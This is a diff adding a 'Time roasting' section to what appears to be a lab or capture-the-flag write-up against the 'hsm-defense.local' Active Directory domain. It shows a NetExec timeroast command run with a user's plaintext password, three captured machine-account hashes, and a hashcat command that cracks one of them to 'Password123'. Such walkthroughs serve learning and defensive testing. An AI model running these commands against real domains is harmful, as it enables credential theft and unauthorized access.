@@ -219,3 +219,24 @@ Her credentials get me access to the support portal
 
 Possible weak machine account password
 
+# Time roasting
+
+```python
+nxc smb dc.hsm-defense.local -u 'kelly.johnson' -p 'Lordofwar' -k -M timeroast
+SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\kelly.johnson:Lordofwar 
+TIMEROAST   dc.hsm-defense.local 445    dc               [*] Starting Timeroasting...
+TIMEROAST   dc.hsm-defense.local 445    dc               1000:$sntp-ms$a0da1593719041353b6d9e992fb2d50e$1c0111e900000000000a09bd4c4f434cee57d98daab88ffee1b8428bffbfcd0aee57e664b6c09a8fee57e664b6c0d8a2
+TIMEROAST   dc.hsm-defense.local 445    dc               1105:$sntp-ms$811b6e6e814a190074de4fac0b44397b$1c0111e900000000000a09bd4c4f434cee57d98dac94b380e1b8428bffbfcd0aee57e665589cbab6ee57e665589d0635
+TIMEROAST   dc.hsm-defense.local 445    dc               1122:$sntp-ms$3f0fb4215eacb351b6b6910ea2e81957$1c0111e900000000000a09bd4c4f434cee57d98da98aabc0e1b8428bffbfcd0aee57e66571bba3afee57e66571bbea26
+```
+
+I have got 3 hashes
+
+```python
+hashcat timeroast.hash /usr/share/wordlists/rockyou.txt -m 31300
+
+$sntp-ms$811b6e6e814a190074de4fac0b44397b$1c0111e900000000000a09bd4c4f434cee57d98dac94b380e1b8428bffbfcd0aee57e665589cbab6ee57e665589d0635:Password123
+```
+
+The hash cracked
